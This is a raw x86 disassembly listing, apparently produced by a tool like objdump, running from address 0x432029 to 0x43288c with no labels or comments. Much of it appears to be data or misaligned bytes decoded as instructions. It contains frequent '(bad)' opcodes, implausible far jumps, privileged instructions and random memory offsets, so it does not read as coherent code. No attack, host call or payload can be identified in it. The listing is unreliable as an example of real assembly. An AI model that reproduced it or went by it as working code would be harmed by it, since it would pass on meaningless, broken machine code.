  432029:	fld    DWORD PTR [ebx-0x767cbc78]
  43202f:	pop    es
  432030:	push   0x8d45ffec
  432035:	jmp    0xe6cc653d
  43203a:	push   0x45
  43203c:	jmp    edx
  43203e:	add    DWORD PTR [ebp+0xd],0xfffffff5
  432042:	mov    DWORD PTR [ebp+0x6c],eax
  432045:	(bad)  
  432047:	inc    ebp
  432048:	(bad)  
  432049:	out    dx,al
  43204a:	add    al,0x45
  43204c:	mov    edi,esp
  43204e:	outs   dx,BYTE PTR ds:[esi]
  43204f:	inc    ebp
  432050:	(bad)  
  432051:	jle    0x431fd6
  432053:	idiv   BYTE PTR ds:0x70bc8944
  432059:	mov    dh,0xff
  43205b:	or     DWORD PTR [ebp-0x762609bc],0xffffff88
  432062:	jb     0x431fe7
  432064:	dec    DWORD PTR [eax]
  432066:	mov    ebp,esp
  432068:	test   WORD PTR [ebp-0x1],ax
  43206f:	inc    ebp
  432070:	ror    BYTE PTR [ebx-0x137a279a],0xff
  432077:	adc    edi,edi
  432079:	mov    ebp,edi
  43207b:	mov    eax,DWORD PTR [eax]
  43207d:	cmp    BYTE PTR [esi-0x1],ah
  432080:	test   DWORD PTR [ebx],edi
  432082:	push   DWORD PTR [ebp-0x1]
  432085:	mov    DWORD PTR [esi-0x48],ebp
  432088:	add    BYTE PTR [ebp+0x66],al
  43208b:	jmp    0x432012
  43208d:	pushf  
  43208e:	dec    DWORD PTR [ebx-0x7f940301]
  432094:	add    BYTE PTR [ecx],al
  432096:	data16 add BYTE PTR [ebp-0x7a00c8],al
  43209d:	add    al,al
  43209f:	add    BYTE PTR [esi+0x45],ah
  4320a2:	test   DWORD PTR [ebx+0xff7cff],ecx
  4320a8:	inc    eax
  4320a9:	mov    DWORD PTR [eax],eax
  4320ab:	mov    esp,DWORD PTR [esi-0x4]
  4320ae:	inc    ebp
  4320af:	cmp    BYTE PTR [eax+0x4701],0x38
  4320b6:	mov    DWORD PTR [ebp-0x7e],ebp
  4320b9:	add    BYTE PTR [edi-0x73],al
  4320bc:	push   0xffffffcd
  4320be:	mov    WORD PTR [ebp+0x64],ax
  4320c2:	(bad)  
  4320c3:	call   eax
  4320c5:	mov    esp,esi
  4320c7:	data16 cmc 
  4320c9:	test   DWORD PTR [ebp-0x1],eax
  4320cc:	(bad)  
  4320ce:	out    0xc0,eax
  4320d0:	lea    esp,[esi-0x30]
  4320d3:	test   DWORD PTR [edx+0x44ff80ff],ecx
  4320d9:	inc    edi
  4320da:	jmp    0x75ff:0x40858866
  4320e1:	dec    DWORD PTR [ebp-0x7a992f40]
  4320e7:	test   esi,edi
  4320e9:	(bad)  
  4320ea:	(bad)  
  4320eb:	inc    DWORD PTR [ebp-0x9901b9]
  4320f1:	test   DWORD PTR [ebx+0x51fff4ff],ecx
  4320f7:	rcl    BYTE PTR [ecx+0x66],0x33
  4320fb:	test   DWORD PTR [ebx+0xff72ff],edi
  432101:	inc    edi
  432102:	ret    
  432103:	mov    ax,WORD PTR [ebp-0x3f0004]
  43210a:	push   eax
  43210b:	mov    DWORD PTR [ebp-0x77],0xff98748b
  432112:	add    BYTE PTR [ebx-0x764f0839],al
  432118:	push   DWORD PTR [esi+0x1]
  43211b:	inc    DWORD PTR [eax]
  43211d:	mov    eax,0xff99ff
  432122:	or     BYTE PTR [ecx-0x7a87bb],cl
  432128:	jne    0x4320e2
  43212a:	add    DWORD PTR [edx-0x76edff74],0xff707a8d
  432134:	mov    ecx,0xd74fb8
  432139:	add    cl,al
  43213b:	mov    DWORD PTR [ecx-0x3f007784],ecx
  432141:	or     DWORD PTR [ebx+0x558966e4],0x7e
  432148:	(bad)  
  432149:	(bad)  
  43214a:	std    
  43214b:	mov    eax,0x8c2789
  432150:	ret    0x6689
  432153:	adc    BYTE PTR [ebp+0x40],0x8d
  432157:	add    bh,ah
  432159:	mov    WORD PTR [ebp-0x70],ax
  43215d:	(bad)  
  43215e:	ret    0x6605
  432161:	or     BYTE PTR [ebp-0x77],dl
  432164:	lea    eax,[ecx+eiz*8-0x6b1676bb]
  43216b:	loop   0x4320f6
  43216d:	(bad)  
  43216e:	xchg   esi,eax
  43216f:	aam    0xcf
  432171:	out    dx,al
  432172:	mov    DWORD PTR [esi-0x68],edi
  432175:	inc    ebp
  432176:	dec    edx
  432177:	pop    ecx
  432178:	mov    edx,DWORD PTR [eax]
  43217a:	repnz push bp
  43217d:	or     BYTE PTR [ebx+0x5510663a],0x49
  432184:	(bad)  
  432185:	repnz cmp eax,0xa0898945
  43218b:	mov    ah,0x89
  43218d:	jmp    DWORD PTR [edx+0x66b0418d]
  432193:	inc    DWORD PTR [ebp+0x50]
  432196:	add    DWORD PTR [ebp+0x3],0xffffffbe
  43219a:	mov    DWORD PTR [eax],ecx
  43219c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43219d:	pop    es
  43219e:	inc    ecx
  43219f:	(bad)  
  4321a0:	cwd    
  4321a2:	inc    ebp
  4321a3:	xor    ah,BYTE PTR [esi+0x3]
  4321a6:	dec    ebp
  4321a7:	push   eax
  4321a8:	inc    bp
  4321aa:	jge    0x43212f
  4321ac:	mov    esp,DWORD PTR [esi-0x18]
  4321af:	mov    esi,DWORD PTR [edi+0x7d809cfc]
  4321b5:	add    DWORD PTR [ebx],esi
  4321b7:	add    BYTE PTR [ebx],al
  4321b9:	test   DWORD PTR [ebx],esi
  4321bb:	(bad)  
  4321bc:	inc    WORD PTR [ebp+0x0]
  4321c0:	mov    eax,DWORD PTR [eax]
  4321c2:	call   0x8898d8f7
  4321c7:	mov    esi,eax
  4321c9:	clc    
  4321ca:	ret    
  4321cb:	rol    cl,0xa
  4321ce:	mov    DWORD PTR ds:0x7c0ec88,esi
  4321d4:	mov    edx,edi
  4321d6:	pushf  
  4321d7:	pop    es
  4321d8:	jmp    DWORD PTR [edx+0x66]
  4321db:	add    BYTE PTR [ebp-0x990175],al
  4321e1:	inc    ebp
  4321e2:	test   DWORD PTR [ebx-0x2f00ea02],eax
  4321e8:	push   ebp
  4321e9:	mov    edi,eax
  4321eb:	mov    dh,BYTE PTR [eax+0x266ff51]
  4321f1:	push   ebp
  4321f2:	add    BYTE PTR [ebx-0x764b0777],al
  4321f8:	dec    DWORD PTR [esi+0x661851e8]
  4321fe:	add    BYTE PTR [ebp-0x7b],dl
  432201:	cmp    esi,0x3
  432204:	dec    DWORD PTR [ecx+0x51fe9285]
  43220a:	jmp    DWORD PTR [esi-0x75]
  43220d:	push   ebp
  43220e:	hlt    
  43220f:	data16 (bad) 
  432211:	dec    ebp
  432212:	ret    
  432213:	mov    ecx,DWORD PTR [ebp-0xb29b9a]
  432219:	lea    edx,[eax-0x1]
  43221c:	jne    0x4321ef
  43221e:	dec    DWORD PTR [ecx-0x2f7a63f8]
  432224:	dec    BYTE PTR [ecx+0x51559eff]
  43222a:	mov    DWORD PTR [esi-0x4c],esp
  43222d:	push   ebp
  43222e:	jmp    DWORD PTR [esi-0x18]
  432231:	inc    ebp
  432232:	sbb    BYTE PTR [ebp-0x767ad900],cl
  432238:	(bad)  
  432239:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43223a:	inc    eax
  43223c:	test   DWORD PTR [esi-0x2],esp
  43223f:	inc    ebp
  432240:	dec    DWORD PTR [ebp-0x760bde75]
  432246:	(bad)  
  432247:	test   al,0xc3
  432249:	mov    DWORD PTR [ebp-0x769b56],ecx
  43224f:	lods   al,BYTE PTR ds:[esi]
  432250:	push   eax
  432251:	inc    ebp
  432252:	jne    0x432263
  432254:	dec    DWORD PTR [ebp+0x8]
  432257:	mov    eax,DWORD PTR [edi]
  432259:	sbb    al,0x0
  43225b:	(bad)  
  43225c:	mov    eax,0xc14fc3
  432261:	mov    DWORD PTR [eax-0x64],edi
  432264:	inc    bp
  432266:	test   DWORD PTR [edi],ecx
  432268:	dec    DWORD PTR [ebp-0x1]
  43226b:	xor    eax,edi
  43226d:	add    ecx,DWORD PTR [ecx-0x99bdcd]
  432273:	inc    ebp
  432274:	xor    DWORD PTR [ebx],0x43
  432277:	mov    WORD PTR [ebp-0x1bc],ax
  43227e:	lea    ecx,[ecx-0x7677fe]
  432284:	inc    esi
  432285:	(bad)  
  432286:	call   FWORD PTR [ebp+ecx*4-0x3e72be01]
  43228d:	pushf  
  43228e:	rol    DWORD PTR [ebp-0x72019a],0xff
  432295:	add    bh,bh
  432297:	add    BYTE PTR [edi],cl
  432299:	test   DWORD PTR [eax],eax
  43229b:	(bad)  
  43229c:	dec    WORD PTR [ebp-0xff002d]
  4322a3:	mov    DWORD PTR [eax-0x48],esi
  4322a6:	add    bh,bh
  4322a8:	lea    cx,[ebp-0x50]
  4322af:	push   eax
  4322b0:	rol    BYTE PTR [ebp+0x0],1
  4322b3:	xor    esp,DWORD PTR [esi+0x3]
  4322b6:	lea    edx,[eax-0x1]
  4322b9:	test   edi,edi
  4322bb:	dec    DWORD PTR [ebp-0x1]
  4322be:	mov    edi,edi
  4322c0:	dec    eax
  4322c1:	clc    
  4322c2:	call   DWORD PTR [ebp-0x73]
  4322c5:	lea    esi,[eax+0x51ffff88]
  4322cb:	lea    ecx,[ebp-0x78]
  4322ce:	test   WORD PTR [ebp-0x2],ax
  4322d5:	popf   
  4322d6:	push   ecx
  4322d7:	add    BYTE PTR [ecx-0x77],dl
  4322da:	xor    edi,DWORD PTR [eax-0x724a007d]
  4322e0:	cdq    
  4322e1:	mov    al,0x32
  4322e3:	inc    DWORD PTR [ebx]
  4322e5:	push   eax
  4322e6:	push   ecx
  4322e7:	inc    ebp
  4322e8:	shl    BYTE PTR [ebx],1
  4322ea:	lea    eax,[ebx]
  4322ec:	call   DWORD PTR [eax-0x1]
  4322ef:	test   DWORD PTR [ebx],esi
  4322f1:	inc    DWORD PTR [eax-0x1]
  4322f4:	(bad)  
  4322f5:	(bad)  
  4322f6:	(bad)  
  4322f7:	clc    
  4322f8:	call   DWORD PTR [ebp+0x50]
  4322fb:	jmp    0xcc2475
  432300:	inc    esp
  432301:	jae    0x432302
  432303:	add    BYTE PTR [ecx-0x384f73],cl
  432309:	mov    DWORD PTR [ebx-0x7f0003c0],ecx
  43230f:	mov    eax,DWORD PTR [ecx]
  432311:	data16 add BYTE PTR [ebp-0xb50077],al
  432318:	inc    eax
  43231a:	lea    esp,[esi+0x1c]
  43231d:	test   DWORD PTR [ecx-0xb301],ecx
  432323:	inc    edi
  432324:	(bad)  
  432325:	dec    si
  432327:	test   edi,edi
  432329:	push   DWORD PTR [ecx]
  43232b:	(bad)  
  43232c:	jnp    0x43237d
  43232e:	(bad)  
  43232f:	mov    edx,DWORD PTR [edx-0x7d]
  432332:	(bad)  
  432333:	mov    ebx,0x563a8935
  432338:	(bad)  
  432339:	call   FWORD PTR [esi-0x47]
  43233c:	inc    DWORD PTR ds:0x893000e2
  432342:	(bad)  
  432343:	pop    eax
  432344:	mov    ah,0xff
  432346:	(bad)  
  432347:	mov    ecx,0x5745
  43234c:	dec    DWORD PTR [ecx-0xf7a501]
  432352:	(bad)  
  432353:	mov    ecx,0x456108
  432358:	mov    ecx,DWORD PTR [ecx-0x3fa3e4]
  43235e:	test   BYTE PTR [ebp-0x72ff23fd],cl
  432364:	inc    BYTE PTR gs:[eax]
  432367:	inc    DWORD PTR [ebp-0x73]
  43236a:	ss (bad) 
  43236c:	pushf  
  43236d:	inc    edi
  43236f:	mov    ebx,eax
  432371:	hlt    
  432372:	test   DWORD PTR [ecx-0xbab708],ecx
  432378:	cmp    bh,BYTE PTR [esi+0x7c7089c]
  43237e:	lock into 
  432380:	test   eax,eax
  432382:	clc    
  432383:	mov    ebx,0x367245
  432388:	lahf   
  432389:	retf   
  43238a:	mov    ecx,DWORD PTR [ebx+0x40808dfc]
  432390:	add    edi,edi
  432392:	add    BYTE PTR [ecx+0x45],dl
  432395:	ror    BYTE PTR [ebx+0x4d44fc8d],0xff
  43239c:	mov    edx,DWORD PTR [ecx-0x74]
  43239f:	inc    DWORD PTR [eax]
  4323a1:	cld    
  4323a2:	mov    eax,DWORD PTR [ebp-0x6f0175]
  4323a8:	add    BYTE PTR [ebp-0x1b0177],al
  4323ae:	jge    0x4323f5
  4323b0:	test   DWORD PTR [ebx+0xff9875],ecx
  4323b6:	sbb    BYTE PTR [esi+0x55],ah
  4323b9:	xchg   ebp,eax
  4323ba:	call   0x431ebe
  4323bf:	push   edi
  4323c0:	inc    ebp
  4323c1:	mov    dx,WORD PTR [ebp-0xfc0075]
  4323c8:	cmp    al,0x85
  4323ca:	ud0    eax,DWORD PTR [ebp-0x1]
  4323ce:	test   DWORD PTR [edi+0x74],ecx
  4323d1:	dec    edi
  4323d2:	inc    DWORD PTR [ebp-0xf70004]
  4323d8:	dec    DWORD PTR [edi-0x75]
  4323db:	dec    edi
  4323dc:	cld    
  4323dd:	test   DWORD PTR [eax+0xff01ff],eax
  4323e3:	icebp  
  4323e4:	add    BYTE PTR [edi-0x3a],cl
  4323e7:	test   ebx,eax
  4323e9:	inc    BYTE PTR [ebp-0x1]
  4323ec:	jne    0x4323ee
  4323ee:	mov    eax,DWORD PTR [eax]
  4323f0:	cld    
  4323f1:	xor    BYTE PTR [ecx+0x500155],cl
  4323f7:	push   ebp
  4323f8:	xor    DWORD PTR [ecx+0x45011c80],ecx
  4323fe:	add    BYTE PTR [ebp+0x35e90f50],al
  432404:	add    al,BYTE PTR [eax]
  432406:	add    BYTE PTR [ebx-0x38fe4f80],al
  43240c:	add    ah,ch
  43240e:	or     BYTE PTR [ebp+0x4501f845],dh
  432414:	jmp    0xdf270f
  432419:	(bad)  
  43241a:	nop    ecx
  43241d:	test   DWORD PTR [ebp+0x4502f8],eax
  432423:	cmp    BYTE PTR [ebp-0x64],cl
  432426:	mov    eax,edi
  432428:	mov    ebx,DWORD PTR [eax+edx*2]
  43242b:	add    eax,0x45fef885
  432430:	dec    DWORD PTR [ebx+0x339445]
  432436:	add    ecx,DWORD PTR [ecx+0x4500f889]
  43243c:	dec    DWORD PTR [ebx-0x460f0375]
  432442:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  432443:	add    esi,edi
  432445:	add    bh,bh
  432447:	rdpmc  
  432449:	add    BYTE PTR [ebx],0x1
  43244c:	mov    DWORD PTR [eax],eax
  43244e:	add    al,0x45
  432450:	dec    DWORD PTR [ecx-0x360b3373]
  432456:	dec    DWORD PTR [esi]
  432458:	push   eax
  432459:	jne    0x4324a0
  43245b:	mov    esi,DWORD PTR [ebx]
  43245d:	cld    
  43245e:	add    ebp,ebx
  432460:	push   eax
  432461:	inc    DWORD PTR [ebp-0x75]
  432464:	add    eax,0x800e4
  432469:	add    BYTE PTR [ebx-0x7f7403bf],cl
  43246f:	mov    DWORD PTR [ecx],eax
  432471:	sbb    al,0x0
  432473:	leave  
  432474:	test   DWORD PTR [edi-0x2],eax
  432477:	jne    0x432478
  432479:	call   0xff440f7e
  43247e:	xor    BYTE PTR [ebp+0x4d],al
  432481:	mov    edi,edi
  432483:	enter  0x8,0x4d
  432487:	mov    ecx,DWORD PTR [ebx-0x7fc74cd]
  43248d:	mov    eax,DWORD PTR [eax]
  43248f:	cld    
  432490:	add    DWORD PTR [ecx],ebx
  432492:	inc    ebp
  432493:	dec    ebp
  432494:	mov    DWORD PTR [ebx+0x1ccc8b],ecx
  43249a:	inc    eax
  43249b:	dec    DWORD PTR [ecx-0x270375]
  4324a1:	add    BYTE PTR [ebx-0x39d72701],cl
  4324a7:	xchg   ecx,eax
  4324a8:	ret    
  4324a9:	add    BYTE PTR [ebp-0x830075],al
  4324af:	add    BYTE PTR [ebp-0x75],al
  4324b2:	mov    DWORD PTR [ebp+0x8ff0404],ecx
  4324b8:	lea    edi,[edi-0xc]
  4324bb:	add    bh,bh
  4324bd:	mov    edx,DWORD PTR [eax-0x7b]
  4324c0:	inc    ebp
  4324c1:	rdpmc  
  4324c3:	jne    0x4324c8
  4324c5:	add    BYTE PTR [eax-0x75],dl
  4324c8:	inc    ebp
  4324c9:	clc    
  4324ca:	add    eax,0x400009
  4324cf:	mov    DWORD PTR [ebx-0x7f000304],ecx
  4324d5:	mov    eax,DWORD PTR [ecx]
  4324d7:	in     al,dx
  4324d8:	add    dh,al
  4324da:	test   ebx,eax
  4324dc:	inc    BYTE PTR [ebp-0xff0001]
  4324e2:	add    BYTE PTR [ebp-0x43],al
  4324e5:	cmp    esi,0xfffffff8
  4324e8:	(bad)  
  4324e9:	push   DWORD PTR [eax]
  4324eb:	add    BYTE PTR [ebp-0x3a],dl
  4324ee:	test   ebx,eax
  4324f0:	je     0x432477
  4324f2:	mov    edi,edi
  4324f4:	sbb    al,0xff
  4324f6:	test   DWORD PTR gs:[eax],eax
  4324f9:	(bad)  
  4324fa:	js     0x4324fb
  4324fc:	add    BYTE PTR [ebx-0x39b20bdd],cl
  432502:	sub    eax,ebx
  432504:	mov    ecx,DWORD PTR [ebx-0x55130377]
  43250a:	add    eax,DWORD PTR [eax]
  43250c:	dec    ebp
  43250d:	push   eax
  43250e:	mov    al,BYTE PTR [ebp+0x1]
  432511:	mov    eax,DWORD PTR [ebp-0x68]
  432514:	mov    eax,DWORD PTR [eax]
  432516:	sbb    bh,al
  432518:	or     ah,dh
  43251a:	dec    ebp
  43251b:	inc    DWORD PTR [eax+0x4]
  43251e:	push   ecx
  43251f:	add    BYTE PTR [edx-0x1],dh
  432522:	mov    ecx,DWORD PTR [ecx+0x55cfe83c]
  432528:	or     DWORD PTR [ebx-0x7ff3400],0x8b5545d7
  432532:	add    ecx,DWORD PTR [ecx-0x1be77477]
  432538:	push   ecx
  432539:	cmp    BYTE PTR [ebx],al
  43253b:	inc    ebp
  43253c:	mov    DWORD PTR [ebx-0x7aaaafe4],ecx
  432542:	(bad)  
  432543:	(bad)  
  432544:	in     al,0xff
  432546:	add    BYTE PTR [ebp+0x0],al
  432549:	xor    eax,DWORD PTR [eax-0x7c76fffd]
  43254f:	add    al,bh
  432551:	(bad)  
  432552:	jmp    0x8d85:0x74b0558d
  432559:	dec    DWORD PTR [eax]
  43255b:	call   DWORD PTR [ebp-0x7b]
  43255e:	mov    edi,esi
  432560:	lock call DWORD PTR [ebp-0x75]
  432564:	mov    esi,esp
  432566:	mov    ah,0xc6
  432568:	mov    bh,0xc3
  43256a:	mov    DWORD PTR [ebx-0x110003c4],ecx
  432570:	add    DWORD PTR [eax],0x450050ff
  432576:	mov    DWORD PTR [ebx+0x9598cc],ecx
  43257c:	inc    edi
  43257e:	push   esp
  432580:	jmp    0xcd00:0x670481ff
  432587:	mov    DWORD PTR [ebx],esi
  432589:	clc    
  43258a:	cmp    edi,0xff9cff3b
  432590:	jne    0x43259a
  432592:	mov    eax,eax
  432594:	add    esi,DWORD PTR [eax]
  432596:	int3   
  432597:	inc    ebp
  432598:	cmp    al,0x83
  43259a:	add    BYTE PTR [eax],bl
  43259c:	adc    DWORD PTR [ebx+0x768b5055],eax
  4325a2:	add    ecx,DWORD PTR [ebx-0x30ba17c7]
  4325a8:	mov    edi,eax
  4325aa:	cmp    BYTE PTR [ebp+0x45],cl
  4325ad:	jmp    0x43253a
  4325af:	mov    ebx,DWORD PTR [esp+ebp*8]
  4325b2:	inc    ebp
  4325b3:	or     al,0x2
  4325b5:	dec    DWORD PTR [ebp+0x18]
  4325b8:	jne    0x43260f
  4325ba:	mov    ecx,DWORD PTR [eax+0x1c558bf8]
  4325c0:	mov    edi,DWORD PTR [ebx]
  4325c2:	in     al,0x50
  4325c4:	xchg   ecx,eax
  4325c5:	jmp    0x34374ca
  4325ca:	adc    al,0x8b
  4325cc:	inc    ebp
  4325cd:	mov    al,ds:0x8b04008b
  4325d2:	push   ebp
  4325d3:	sub    ecx,DWORD PTR [ecx-0x2d381318]
  4325d9:	push   ebp
  4325da:	test   DWORD PTR [ebx-0x2800d701],ecx
  4325e0:	inc    ebp
  4325e1:	dec    ebp
  4325e2:	mov    DWORD PTR [ecx+0x45ffb8f8],ecx
  4325e8:	mov    DWORD PTR [eax],0xe9ff00f4
  4325ee:	add    al,0x0
  4325f0:	add    BYTE PTR [eax],al
  4325f2:	mov    eax,edx
  4325f4:	push   eax
  4325f5:	rol    DWORD PTR [ebp-0xf0177],1
  4325fb:	bound  eax,QWORD PTR [ebp+0x50]
  4325fe:	xor    ecx,DWORD PTR [ecx+0x5589b403]
  432604:	add    BYTE PTR [ecx+0x558df0ff],cl
  43260a:	mov    al,0xf
  43260c:	test   DWORD PTR [edx],edx
  43260e:	call   DWORD PTR [ebp-0x7a0001]
  432614:	(bad)  
  432615:	loop   0x432616
  432617:	jnp    0xc6991a1d
  43261d:	mov    eax,ebx
  43261f:	cmp    al,0x8b
  432621:	(bad)  
  432622:	cld    
  432623:	shr    esi,0xc
  432626:	add    dl,al
  432628:	push   eax
  432629:	lea    eax,[ebp-0x1]
  43262c:	mov    edx,esi
  43262e:	cwde   
  43262f:	cli    
  432630:	add    BYTE PTR [ebp+0x1ffff8ff],al
  432636:	or     BYTE PTR [eax],cl
  432638:	inc    ebp
  432639:	dec    ebp
  43263a:	inc    DWORD PTR [ebx+0x74803914]
  432640:	add    DWORD PTR [ebx+0x451800],ecx
  432646:	call   DWORD PTR [eax+edx*1]
  432649:	add    ecx,DWORD PTR [ebp-0x34]
  43264c:	push   edi
  43264d:	adc    al,0x8
  43264f:	mov    edx,DWORD PTR [ebp-0x14]
  432652:	mov    ecx,DWORD PTR [ebp+0x18]
  432655:	add    DWORD PTR [ebp-0x4c],0xffffff8d
  432659:	inc    DWORD PTR [eax+esi*8]
  43265c:	inc    ebp
  43265d:	stos   BYTE PTR es:[edi],al
  43265e:	mov    edx,DWORD PTR [ebp-0x4]
  432661:	add    DWORD PTR [ebp-0x1c],eax
  432664:	mov    edx,DWORD PTR [ebp-0x70]
  432667:	cmp    eax,DWORD PTR [eax]
  432669:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43266a:	mov    eax,DWORD PTR [eax]
  43266c:	cld    
  43266d:	jae    0x4325ef
  43266f:	add    eax,DWORD PTR [ecx]
  432671:	clc    
  432672:	add    BYTE PTR [eax+0x30],dl
  432675:	mov    DWORD PTR [ecx],esi
  432677:	clc    
  432678:	pop    ds
  432679:	inc    ebp
  43267a:	xor    al,BYTE PTR [ebp+0x6f760f3a]
  432680:	(bad)  
  432681:	push   DWORD PTR [edi]
  432683:	mov    ecx,DWORD PTR [ebx+0x398503e8]
  432689:	(bad)  
  43268a:	jae    0x43268b
  43268c:	mov    eax,DWORD PTR [ebp-0x740175]
  432692:	sub    eax,DWORD PTR [eax]
  432694:	add    eax,DWORD PTR [eax]
  432696:	mov    DWORD PTR [ecx+0x5f],eax
  432699:	mov    DWORD PTR [ebx-0x4],ebx
  43269c:	ret    0xff
  43269f:	mov    ecx,DWORD PTR [ebx+0x1cc683d8]
  4326a5:	ret    
  4326a6:	mov    eax,DWORD PTR [ebp-0x6f0075]
  4326ac:	add    BYTE PTR [ebp-0x7d],al
  4326af:	mov    DWORD PTR [eax],eax
  4326b1:	add    al,0x84
  4326b3:	inc    DWORD PTR [ecx]
  4326b5:	lea    eax,[eax]
  4326b7:	hlt    
  4326b8:	sar    bh,cl
  4326ba:	test   BYTE PTR [eax+0x1],dl
  4326bd:	inc    ebp
  4326be:	add    BYTE PTR [ebx],dh
  4326c0:	test   BYTE PTR [ebx],0x84
  4326c3:	push   eax
  4326c4:	add    BYTE PTR [ebp+0x0],al
  4326c7:	add    eax,0x86
  4326cc:	add    BYTE PTR [ebx-0x7f7b0340],cl
  4326d2:	add    BYTE PTR [ecx],al
  4326d4:	add    BYTE PTR [eax],al
  4326d6:	mov    esi,0x550030
  4326db:	mov    ecx,DWORD PTR [edi]
  4326dd:	cld    
  4326de:	fidiv  DWORD PTR [ebp+0x0]
  4326e1:	mov    edi,DWORD PTR [ecx]
  4326e3:	xor    BYTE PTR [eax+eax*1],0x84
  4326e7:	add    eax,DWORD PTR [eax]
  4326e9:	sbb    BYTE PTR [eax],al
  4326eb:	jne    0x43269e
  4326ed:	mov    eax,DWORD PTR [ecx]
  4326ef:	sbb    BYTE PTR [eax],al
  4326f1:	mov    DWORD PTR [ebp-0x1],esp
  4326f4:	add    BYTE PTR [eax+0x30e45ca],bh
  4326fa:	ret    0xb7fc
  4326fd:	dec    ebp
  4326fe:	or     al,0x89
  432700:	dec    ebp
  432701:	cld    
  432702:	cmovne ecx,DWORD PTR [eax-0x75]
  432706:	add    edi,esp
  432708:	seto   BYTE PTR [esi-0x72ffffff]
  43270f:	inc    ebp
  432710:	adc    al,0x8b
  432712:	mov    DWORD PTR [eax+ebp*8-0x740100],ecx
  432719:	cmp    DWORD PTR [edi+0x72],edx
  43271c:	xor    DWORD PTR [ebx-0x74ee7481],ecx
  432722:	gs cmp al,0x0
  432725:	je     0x4326fd
  432727:	push   eax
  432728:	sar    BYTE PTR [eax],1
  43272a:	mov    bh,0x3e
  43272c:	push   cs
  43272d:	cmp    DWORD PTR [edi-0x4cff3f4],esi
  432733:	add    DWORD PTR [ecx+0x12],ebp
  432736:	dec    edx
  432737:	(bad)  
  432738:	mov    eax,edx
  43273a:	in     al,dx
  43273b:	adc    DWORD PTR [ecx],esi
  43273d:	pop    esi
  43273e:	inc    ecx
  43273f:	leave  
  432740:	or     DWORD PTR [eax],ebx
  432742:	gs push ebp
  432744:	add    ah,ch
  432746:	into   
  432747:	in     al,dx
  432748:	enter  0xb756,0xf0
  43274c:	push   cs
  43274d:	xor    DWORD PTR [edi-0x4fff3ff],0x790f2b38
  432757:	or     cl,BYTE PTR [ecx+0x7d85fc00]
  43275d:	jnp    0x7443ac65
  432763:	test   DWORD PTR [ebx+0x1cfae40f],ecx
  432769:	add    BYTE PTR [edi],cl
  43276b:	mov    edi,DWORD PTR [ecx-0x78]
  43276e:	ltr    WORD PTR [ecx-0x7b]
  432772:	dec    DWORD PTR [edi]
  432774:	clc    
  432775:	out    0x45,eax
  432777:	add    BYTE PTR [eax],cl
  432779:	cmp    ebx,0xffffff8c
  43277c:	jge    0x43277e
  43277e:	jb     0x432790
  432780:	je     0x522800
  432786:	pop    edx
  432787:	push   esi
  432788:	mov    ecx,DWORD PTR [edi]
  43278a:	in     al,dx
  43278b:	rol    DWORD PTR [ebp+0x0],1
  43278e:	or     DWORD PTR [ebx+0xfb8c08],0x4d
  432795:	cmp    DWORD PTR [ecx],0xfffffff0
  432798:	hlt    
  432799:	mov    esp,DWORD PTR [eax+0xf034d2b]
  43279f:	(bad)  
  4327a1:	push   eax
  4327a2:	jns    0xb8430c20
  4327a8:	lock push cs
  4327aa:	ror    edx,0x3
  4327ad:	test   BYTE PTR [ecx+0x5500e800],cl
  4327b3:	dec    eax
  4327b4:	rcpps  xmm4,XMMWORD PTR [ecx+0x4d]
  4327b8:	(bad)  
  4327b9:	mov    esi,0x7f33ff5f
  4327be:	inc    eax
  4327bf:	test   DWORD PTR [edx],eax
  4327c1:	je     0x432783
  4327c3:	mov    ecx,ecx
  4327c5:	adc    DWORD PTR [ebp-0xc],0xffffffec
  4327c9:	and    eax,DWORD PTR [eax+0xf0103]
  4327cf:	jp     0x4327bd
  4327d1:	rcpps  xmm3,XMMWORD PTR [edx-0x25]
  4327d5:	add    edx,DWORD PTR [edi+0x74]
  4327d8:	sbb    BYTE PTR [ebp+0x4d001484],cl
  4327de:	add    BYTE PTR [ebp-0x74c48bbb],al
  4327e4:	je     0x432769
  4327e6:	cmp    eax,edi
  4327e8:	js     0x43280d
  4327ea:	add    eax,0xeb0fc003
  4327ef:	jns    0x43277c
  4327f1:	vmread DWORD PTR [ecx+0x45],ebx
  4327f5:	add    ecx,DWORD PTR [ebx+0x508d1c74]
  4327fb:	adc    al,0x8b
  4327fd:	jge    0x432813
  4327ff:	mov    edi,DWORD PTR [eax-0x4]
  432802:	add    edi,DWORD PTR [edi]
  432804:	or     bh,bh
  432806:	push   ebp
  432807:	push   es
  432808:	mov    DWORD PTR [ebp-0x4],ebx
  43280b:	add    edi,esi
  43280d:	pop    es
  43280e:	add    esi,DWORD PTR [edi-0x48ccf183]
  432814:	mov    DWORD PTR [esp+esi*8],ecx
  432817:	inc    ebp
  432818:	pop    ebp
  432819:	xor    DWORD PTR [esi-0x4],0x3b
  43281d:	add    edx,DWORD PTR [ecx+edi*1]
  432820:	push   es
  432821:	clc    
  432822:	mov    bh,0xdb
  432824:	jp     0x4327dd
  432826:	add    cl,BYTE PTR [esi]
  432828:	div    DWORD PTR [edi+0x4d8b0c1c]
  43282e:	test   edi,edi
  432830:	je     0x432826
  432832:	mov    eax,ecx
  432834:	or     BYTE PTR [ebx],al
  432836:	dec    BYTE PTR [ecx+0x7d3bec7d]
  43283c:	jbe    0x4328b0
  43283e:	mov    ecx,DWORD PTR [ebx-0x488017f4]
  432844:	add    ecx,DWORD PTR [esi]
  432846:	cmp    DWORD PTR [edi+0x45fe0cf8],esi
  43284c:	add    eax,DWORD PTR [ebx-0x287af783]
  432852:	je     0x4328a1
  432854:	mov    DWORD PTR [ecx],edi
  432856:	mov    esi,eax
  432858:	hlt    
  432859:	or     BYTE PTR [ecx+0x7dfff4ff],0x5b
  432860:	jb     0x432822
  432862:	jmp    0x43284f
  432864:	xor    esi,DWORD PTR [ebx]
  432866:	pop    edi
  432867:	pop    esi
  432868:	pop    ebx
  432869:	ret    
  43286a:	ret    0x8b
  43286d:	mov    ecx,DWORD PTR [ebx+0x2c008390]
  432873:	xor    DWORD PTR [esi],0xc
  432876:	pushf  
  432877:	xor    ecx,DWORD PTR [ecx+0x4539fc56]
  43287d:	(bad)  
  43287f:	test   DWORD PTR [eax+eax*1+0xcfc8b8b],ebx
  432886:	dec    ebp
  432887:	ret    
  432888:	mov    edi,DWORD PTR [esi-0x4]
  43288b:	pop    eax
  43288c:	dec    ebp
